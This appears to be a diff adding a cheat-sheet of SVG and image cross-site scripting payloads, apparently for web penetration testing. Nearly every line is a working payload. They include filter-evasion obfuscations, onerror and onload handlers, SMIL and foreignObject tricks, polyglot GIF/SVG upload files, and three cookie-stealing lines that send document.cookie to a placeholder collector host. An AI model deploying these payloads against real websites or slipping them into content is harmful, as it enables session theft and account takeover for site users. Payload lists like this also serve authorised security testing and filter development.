@@ -1,0 +1,75 @@
+# SVG / IMAGE XSS PAYLOADS (clean list - most reliable when uploads/reflection hit images)
+# Replace YOUR-COLLABORATOR.com with your collector. Use minimal SVG for length filters.
+
+## 1) Minimal (won't break on tight length filters)
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert`1`>
+<svg onload=alert(1)//
+<svg onload=alert(1)#
+<svg/onload/=/=alert(1)>
+
+## 2) Detection-alert variants
+<svg onload="alert('XSS')">
+<svg onload="console.log('XSS')">
+<svg onload="print()">
+<svg onload="prompt(1)">
+
+## 3) WAF / obfuscation
+<svg oNlOaD=alert(1)>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg onload=Function('alert(1)')()>
+<svg onload=top[8680439..toString(30)](1)>
+<svg onload=parent[`al${'ert'}`](1)>
+<svg onload=setTimeout('alert(1)',100)>
+<svg onload=setInterval('alert(1)',1000)>
+<svg onload="alert&#x28;1&#x29;">
+<svg onload=alert\x28 1 \x29>
+<svg
+onload=alert(1)>
+<svg	onload=alert(1)>
+<svgonload=alert(1)>
+<svg onload=alert%09(1)>
+<svg onload=alert%0a(1)>
+<svg onload=alert%0d(1)>
+
+## 4) Image error handlers (works inside <img> filters)
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(document.cookie)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror=top[8680439..toString(30)](1)>
+
+## 5) SVG with <script> (still executes when svg parsed inline)
+<svg><script>alert(1)</script>
+<svg><script>alert(1)</script></svg>
+<svg><script href="data:alert(1)"/>
+<svg><image href="x" onerror="alert(1)"/>
+
+## 6) foreignObject (XHTML context - reliable inside IE/Edge/Safari sanitized paths)
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></div></foreignObject></svg>
+
+## 7) Animation / SMIL trigger (no script blocked - animate attribute runs JS handler)
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover to='alert(1)'>
+
+## 8) Style/import injection (IE historic, some filters miss)
+<svg><style>@import url('javascript:alert(1)');</style></svg>
+
+## 9) JS protocol in svg context
+<svg><a xmlns="http://www.w3.org/2000/svg" href="javascript:alert(1)"><text x=20 y=20>click</text></a></svg>
+
+## 10) Polyglot file uploads (extension-borne - submit .SVG/.GIF/.JPG with HTML inside)
+GIF89a/*<svg/onload=alert(1)>*/=1;        # gif polyglot header
+<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">  # valid .svg
+# image/svg+xml in avatars:  data:image/svg+xml,<svg onload="alert(1)"/>
+# XSS via SVG in <object>:   <object data="data:image/svg+xml,<svg onload=alert(1)>">
+# fetch cookies back to attacker:
+<svg onload="fetch('https://YOUR-COLLABORATOR.com?c='+document.cookie)">
+<svg onload="new Image().src='https://YOUR-COLLABORATOR.com?c='+document.cookie">
+<svg onload="navigator.sendBeacon('https://YOUR-COLLABORATOR.com', document.cookie)">
+
+## 11) SVG + XML external entity note
+# Common mistake: classic <!DOCTYPE svg [<!ENTITY xxe SYSTEM "data:text/html,<script>...">]> svg
+# executes XXE only if parser resolves external entities (browser SVG parsers DON'T).
+# Use it to check icon/logo parsers on the server side only.
